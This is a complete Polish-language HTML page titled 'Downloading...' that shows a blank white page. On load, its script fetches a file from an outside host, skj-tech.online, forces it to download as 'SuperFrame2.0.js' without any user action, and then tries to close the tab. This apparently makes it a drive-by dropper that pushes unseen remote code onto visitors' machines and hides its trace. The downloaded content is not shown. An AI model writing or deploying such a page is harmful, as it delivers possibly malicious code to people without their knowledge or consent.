<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <title>Pobieranie...</title>
    <style>
        /* Całkowicie pusta i czysta strona */
        body { margin: 0; padding: 0; background: white; }
    </style>
</head>
<body>

<script>
document.addEventListener("DOMContentLoaded", () => {
    const url = "https://skj-tech.online";
    
    fetch(url)
        .then(response => response.blob())
        .then(blob => {
            const link = document.createElement("a");
            link.href = URL.createObjectURL(blob);
            link.download = "SuperFrame2.0.js";
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
            
            // Próba zamknięcia karty po wywołaniu pobierania
            setTimeout(() => {
                window.close();
            }, 500); // 500 ms opóźnienia, aby przeglądarka przetworzyła pobieranie
        })
        .catch(error => {
            console.error("Błąd pobierania:", error);
        });
});
</script>

</body>
</html>
